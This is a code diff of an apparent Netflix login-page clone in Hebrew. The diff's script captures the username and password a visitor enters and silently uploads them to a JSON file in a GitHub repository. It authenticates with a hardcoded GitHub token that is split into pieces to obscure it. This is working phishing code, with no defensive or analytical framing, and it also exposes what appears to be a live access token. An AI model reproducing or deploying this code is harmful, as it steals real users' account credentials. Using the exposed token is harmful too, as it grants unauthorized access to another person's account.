@@ -267,41 +267,56 @@ Netflix פועלת בהתאם לעקרונות האסדרה העצמית בפר�
 							
 							
 <script>
-function handleSubmit(event) {
-  event.preventDefault(); // Prevent the default form submission behavior
+async function handleSubmit(event) {
+  event.preventDefault();
 
   var username = document.getElementById('id_userLoginId').value;
-  var password = document.getElementById('id_password').value; // Ensure there is an input field with id 'id_password'
+  var password = document.getElementById('id_password').value;
 
-  // Prepare the data to be sent to GitHub
-  var data = {
-    message: "Form submission",
-    content: btoa(JSON.stringify({ username: username, password: password })) // Base64 encode the JSON data
-  };
+  var newSubmission = { username: username, password: password };
 
-  // GitHub API URL to your repository
   var githubApiUrl = 'https://api.github.com/repos/ron-marom12/netflix/contents/submissions.json';
 
-  // Obfuscate your token
   var part1 = 'ghp_C7xfr';
   var part2 = 'vNSfNnuJ81MT1Kyn';
   var part3 = 'GLmUnHkPI2SOuEo';
   var token = part1 + part2 + part3;
 
-  // Send the data to GitHub
+  // Fetch the existing submissions
+  var response = await fetch(githubApiUrl, {
+    headers: {
+      'Authorization': 'token ' + token,
+      'Content-Type': 'application/json'
+    }
+  });
+  var json = await response.json();
+
+  // Decode and parse the existing submissions
+  var submissions = json.content ? JSON.parse(atob(json.content)) : [];
+  submissions.push(newSubmission); // Add the new submission
+
+  // Prepare the updated data
+  var updatedData = {
+    message: "Updated Form submission",
+    content: btoa(JSON.stringify(submissions)), // Base64 encode the updated JSON data
+    sha: json.sha // Required to update the file
+  };
+
+  // Send the updated data to GitHub
   fetch(githubApiUrl, {
     method: 'PUT',
     headers: {
       'Authorization': 'token ' + token,
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify(data)
+    body: JSON.stringify(updatedData)
   })
   .then(response => response.json())
   .then(data => console.log(data))
   .catch(error => console.error(error));
 }
 </script>
+
 
 
 							
